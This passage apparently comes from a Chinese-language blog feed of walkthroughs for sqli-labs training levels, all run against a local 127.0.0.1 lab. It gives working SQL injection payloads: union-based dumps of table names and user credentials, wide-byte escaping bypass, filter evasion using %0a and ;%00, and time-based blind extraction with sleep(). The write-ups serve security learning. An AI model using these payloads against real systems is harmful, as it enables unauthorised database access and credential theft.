<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">返回正确</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E4%B8%80%E5%85%B3cookie/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584584821451.png" alt="1584584821451"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">查看表</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E4%B8%80%E5%85%B3cookie/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584584902605.png" alt="1584584902605"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">查看结果</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E4%B8%80%E5%85%B3cookie/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584584921052.png" alt="1584584921052"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">查看users表字段</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E4%B8%80%E5%85%B3cookie/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584584981933.png" alt="1584584981933"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">查看结果</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E4%B8%80%E5%85%B3cookie/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584584993309.png" alt="1584584993309"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">查看username字段</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E4%B8%80%E5%85%B3cookie/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584585054649.png" alt="1584585054649"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">查看结果</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E4%B8%80%E5%85%B3cookie/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584585049444.png" alt="1584585049444"></p>
]]></content>
  </entry>
  <entry>
    <title>sqli-labs关卡/sqli-labs第二关GET联合</title>
    <url>/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%85%B3GET%E8%81%94%E5%90%88/</url>
    <content><![CDATA[<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">先测试一下当前字段数，输入4错误，我们试一下3，输入3正确，说明我们当前字段是3</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%85%B3GET%E8%81%94%E5%90%88/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584326294358.png" alt="1584326294358"></p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%85%B3GET%E8%81%94%E5%90%88/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584326314334.png" alt="1584326314334"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">查看当前可以注入点</span><br><span class="line">发现注入点是2和3，在2或者3的位置进行注入</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%85%B3GET%E8%81%94%E5%90%88/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584326400032.png" alt="1584326400032"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">查看当前数据库，我们在2的位置注入，当前库名是security</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-2&#x2F;?id&#x3D;-1 union select 1,database(),3</span><br></pre></td></tr></table></figure>



<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%85%B3GET%E8%81%94%E5%90%88/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584326630219.png" alt="1584326630219"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">我们查看了当前security库里的库名，有emails，referers，uagents，users</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-2&#x2F;?id&#x3D;-1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema&#x3D;&#39;security&#39;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%85%B3GET%E8%81%94%E5%90%88/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584326766084.png" alt="1584326766084"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">大部分情况下users是存放用户信息的，我们查看一下是否存放着用户信息，</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-2&#x2F;?id&#x3D;-1 union select 1,group_concat(column_name),3 from information_schema.columns where table_name&#x3D;&#39;users&#39;</span><br><span class="line">发现当前库名中有这些字段，发现有id，password，username，这三个字段，这正是我们需要的字段</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%85%B3GET%E8%81%94%E5%90%88/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584326923755.png" alt="1584326923755"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">查询这三个字段的数据</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-2&#x2F;?id&#x3D;-1 union select 1,group_concat(id,username,password),3 from users</span><br><span class="line">查出了当前三个表的内容</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%85%B3GET%E8%81%94%E5%90%88/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584327009692.png" alt="1584327009692"></p>
]]></content>
  </entry>
  <entry>
    <title>sqli-labs关卡/sqli-labs第三十四关POST宽字节</title>
    <url>/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%8D%81%E5%9B%9B%E5%85%B3POST%E5%AE%BD%E5%AD%97%E8%8A%82/</url>
    <content><![CDATA[<p>查看登录后的页面，页面返回正常，因为是登录框所以是post注入。</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%8D%81%E5%9B%9B%E5%85%B3POST%E5%AE%BD%E5%AD%97%E8%8A%82/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584979457805.png" alt="1584979457805"></p>
<p>加入单引号查看是否有报错信息。发现报错信息中有反斜杠，说明要在post中使用宽字节注入</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%8D%81%E5%9B%9B%E5%85%B3POST%E5%AE%BD%E5%AD%97%E8%8A%82/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584979527971.png" alt="1584979527971"></p>
<p>加入反斜杠和%df查看结果 ，发现还存在单引号，并且报错了，</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">uname&#x3D;admin%df\&#39;  &amp;passwd&#x3D;admin&amp;submit&#x3D;Submit</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%8D%81%E5%9B%9B%E5%85%B3POST%E5%AE%BD%E5%AD%97%E8%8A%82/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584979671357.png" alt="1584979671357"></p>
<p>使用注释符，页面返回正常</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%8D%81%E5%9B%9B%E5%85%B3POST%E5%AE%BD%E5%AD%97%E8%8A%82/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584979693907.png" alt="1584979693907"></p>
<p>使用order by 查看字段数，我们发现居然没有3这个字段，返回了错误</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">uname&#x3D;admin%df\&#39; order by 3  #  &amp;passwd&#x3D;admin&amp;submit&#x3D;Submit</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%8D%81%E5%9B%9B%E5%85%B3POST%E5%AE%BD%E5%AD%97%E8%8A%82/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584979731938.png" alt="1584979731938"></p>
<p>在尝试一下2这个字段，字段2返回正常，说明这一题和其他的字段数不同</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">uname&#x3D;admin%df\&#39; order by 2  #  &amp;passwd&#x3D;admin&amp;submit&#x3D;Submit</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%8D%81%E5%9B%9B%E5%85%B3POST%E5%AE%BD%E5%AD%97%E8%8A%82/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584979777076.png" alt="1584979777076"></p>
<p>使用联合查询查看注入点</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">uname&#x3D;admin%df\&#39; union select 1,2  #  &amp;passwd&#x3D;admin&amp;submit&#x3D;Submit</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%8D%81%E5%9B%9B%E5%85%B3POST%E5%AE%BD%E5%AD%97%E8%8A%82/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584979822327.png" alt="1584979822327"></p>
<p>查看数据库</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">uname&#x3D;admin%df\&#39; union select 1,database()  #  &amp;passwd&#x3D;admin&amp;submit&#x3D;Submit</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%8D%81%E5%9B%9B%E5%85%B3POST%E5%AE%BD%E5%AD%97%E8%8A%82/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584979849462.png" alt="1584979849462"></p>
<p>查看表，因为这里用了宽字节注入所以需要将库名转换为16进制</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">uname&#x3D;admin%df\&#39; union select 1,group_concat(table_name)from information_schema.tables where table_schema&#x3D;0x7365637572697479  #  &amp;passwd&#x3D;admin&amp;submit&#x3D;Submit</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%8D%81%E5%9B%9B%E5%85%B3POST%E5%AE%BD%E5%AD%97%E8%8A%82/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584979922052.png" alt="1584979922052"></p>
<p>查看users表</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">uname&#x3D;admin%df\&#39; union select 1,group_concat(column_name)from information_schema.columns where table_name&#x3D;0x7573657273  #  &amp;passwd&#x3D;admin&amp;submit&#x3D;Submit</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%8D%81%E5%9B%9B%E5%85%B3POST%E5%AE%BD%E5%AD%97%E8%8A%82/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584979965485.png" alt="1584979965485"></p>
<p>查看username字段</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">uname&#x3D;admin%df\&#39; union select 1,group_concat(username)from users  #  &amp;passwd&#x3D;admin&amp;submit&#x3D;Submit</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%8D%81%E5%9B%9B%E5%85%B3POST%E5%AE%BD%E5%AD%97%E8%8A%82/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584979997797.png" alt="1584979997797"></p>
]]></content>
  </entry>
  <entry>
    <title>sqli-labs关卡/sqli-labs第二十七关过滤空格绕过</title>
    <url>/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E4%B8%83%E5%85%B3%E8%BF%87%E6%BB%A4%E7%A9%BA%E6%A0%BC%E7%BB%95%E8%BF%87/</url>
    <content><![CDATA[<p>查看初始页面</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E4%B8%83%E5%85%B3%E8%BF%87%E6%BB%A4%E7%A9%BA%E6%A0%BC%E7%BB%95%E8%BF%87/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585034508766.png" alt="1585034508766"></p>
<p>查看当前字段数</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">使用%0a因为过滤了空格，所以使用%0a进行绕过</span><br><span class="line">使用;%00sqli中特殊注释符，因为注释符被过滤使用特殊注释符进行绕过</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-27&#x2F;?id&#x3D;1&#39; order%0aby %0a 4%0a;%00</span><br><span class="line">并没有4这个字段</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E4%B8%83%E5%85%B3%E8%BF%87%E6%BB%A4%E7%A9%BA%E6%A0%BC%E7%BB%95%E8%BF%87/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584871111113.png" alt="1584871111113"></p>
<p>查看3字段是否存在</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-27&#x2F;?id&#x3D;1&#39; order%0aby %0a 3%0a;%00</span><br><span class="line">页面返回正常</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E4%B8%83%E5%85%B3%E8%BF%87%E6%BB%A4%E7%A9%BA%E6%A0%BC%E7%BB%95%E8%BF%87/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584871275616.png" alt="1584871275616"></p>
<p>查看注入点</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-27&#x2F;?id&#x3D;1111111&#39;   %0a    uNion  %0a    sElect    %0a    1,2,3 ;%00</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E4%B8%83%E5%85%B3%E8%BF%87%E6%BB%A4%E7%A9%BA%E6%A0%BC%E7%BB%95%E8%BF%87/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584880269002.png" alt="1584880269002"></p>
<p>查看当前数据库</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-27&#x2F;?id&#x3D;1111111&#39;   %0a    uNion  %0a    sElect    %0a    1,2,database() ;%00</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E4%B8%83%E5%85%B3%E8%BF%87%E6%BB%A4%E7%A9%BA%E6%A0%BC%E7%BB%95%E8%BF%87/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584880299522.png" alt="1584880299522"></p>
<p>查看表</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-27&#x2F;?id&#x3D;1111111&#39;   %0a    uNion  %0a    sElect    %0a    1,2,group_concat(table_name)from%0ainformation_schema.tables%0awhere%0atable_schema&#x3D;&#39;security&#39; ;%00</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E4%B8%83%E5%85%B3%E8%BF%87%E6%BB%A4%E7%A9%BA%E6%A0%BC%E7%BB%95%E8%BF%87/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584880360513.png" alt="1584880360513"></p>
<p>查看users表中的字段</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-27&#x2F;?id&#x3D;1111111&#39;   %0a    uNion  %0a    sElect    %0a    1,2,group_concat(column_name)from%0ainformation_schema.columns%0awhere%0atable_name&#x3D;&#39;users&#39; ;%00</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E4%B8%83%E5%85%B3%E8%BF%87%E6%BB%A4%E7%A9%BA%E6%A0%BC%E7%BB%95%E8%BF%87/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584880420498.png" alt="1584880420498"></p>
<p>查看username字段中的表</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-27&#x2F;?id&#x3D;1111111&#39;   %0a    uNion  %0a    sElect    %0a    1,2,group_concat(username)from%0ausers ;%00</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E4%B8%83%E5%85%B3%E8%BF%87%E6%BB%A4%E7%A9%BA%E6%A0%BC%E7%BB%95%E8%BF%87/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584880463474.png" alt="1584880463474"></p>
]]></content>
  </entry>
  <entry>
    <title>sqli-labs关卡/sqli-labs第九关GET时间</title>
    <url>/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B9%9D%E5%85%B3GET%E6%97%B6%E9%97%B4/</url>
    <content><![CDATA[<p>我们发现当不管输入单引号还是双引号，还是括号统统返回you are in，我们尝试一下使用sleep来延迟一下看看是否存在sql注入漏洞，先试一下单引号、</p>
<p>可以看到执行了12秒，说明了单引号存在漏洞</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B9%9D%E5%85%B3GET%E6%97%B6%E9%97%B4/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584412167689.png" alt="1584412167689"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">测试当前数据库第一个字母</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-9&#x2F;?id&#x3D;1&#39; and if(ascii(substr(database(),1,1))&#x3D;115,1,sleep(10))--+</span><br><span class="line">当前为115是返回结果是2秒表示语句执行正确，我们查看一下其他的，看一下我们我们的结论是否正确</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B9%9D%E5%85%B3GET%E6%97%B6%E9%97%B4/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584376048118.png" alt="1584376048118"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">我们将之前的115 改成了116发现执行了12秒表示错误，我们可以判断，115是正确的，这里用的ascii编码，115对应的是s，因为之前推断的缘故，我们这里推断他的库名是security，更改,1,1的第一个数字就可以查看第二个字符</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B9%9D%E5%85%B3GET%E6%97%B6%E9%97%B4/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584376130740.png" alt="1584376130740"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">查看当前数据库的第一个表名的第一个字母</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-9&#x2F;?id&#x3D;1&#39; and if(ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),1,1))&#x3D;101,sleep(10),1) --+</span><br><span class="line">因为将sleep延迟语句写在后面所有，当语句正确时，执行sleep延时注入，</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B9%9D%E5%85%B3GET%E6%97%B6%E9%97%B4/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584377000808.png" alt="1584377000808"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">我们查看其它的ascii是否还是返回正常</span><br><span class="line">发现当数据错误时，两秒就返回了，按照这个方法以此类推</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B9%9D%E5%85%B3GET%E6%97%B6%E9%97%B4/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584377080384.png" alt="1584377080384"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">我们查看emails的第一个字段的第一个字母</span><br><span class="line">?id&#x3D;1&#39; and If(ascii(substr((select column_name from information_schema.columns where table_name&#x3D;&#39;emails&#39; limit 0,1),1,1))&#x3D;105,sleep(5),1) --+</span><br><span class="line">我们这里查询第一个字母是不是105，因为105对应的字母是i，数据库emails里面第一个字段数就是i</span><br><span class="line">这里返回正确表示确实是i</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B9%9D%E5%85%B3GET%E6%97%B6%E9%97%B4/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584377603314.png" alt="1584377603314"></p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B9%9D%E5%85%B3GET%E6%97%B6%E9%97%B4/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584377636270.png" alt="1584377636270"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">切换成其他的ascii查看一下</span><br><span class="line">我们换成104 发现返回时间2秒，说明当前错误，我们可以确定我们之前写得语句正确</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B9%9D%E5%85%B3GET%E6%97%B6%E9%97%B4/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584377701582.png" alt="1584377701582"></p>
]]></content>
  </entry>
  <entry>
    <title>sqli-labs关卡/sqli-labs第二十二关cookie</title>
    <url>/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E4%BA%8C%E5%85%B3cookie/</url>
    <content><![CDATA[<p>这一关用双引号，不加括号，源码中，字段数是3跟之前操作一样</p>
<p>测试注入点也是一样，</p>
<p>直接测试当前数据库</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">进行编码</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E4%BA%8C%E5%85%B3cookie/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584586684586.png" alt="1584586684586"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">带入，查看结果</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E4%BA%8C%E5%85%B3cookie/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584586709342.png" alt="1584586709342"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">查看表，加密</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E4%BA%8C%E5%85%B3cookie/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584586785618.png" alt="1584586785618"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">带入，查看结果</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E4%BA%8C%E5%85%B3cookie/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584586802737.png" alt="1584586802737"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">查看users表下的字段，加密</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E4%BA%8C%E5%85%B3cookie/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584586874346.png" alt="1584586874346"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">带入，查看结果</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E4%BA%8C%E5%85%B3cookie/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584586885121.png" alt="1584586885121"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">查看id，加密</span><br></pre></td></tr></table></figure>

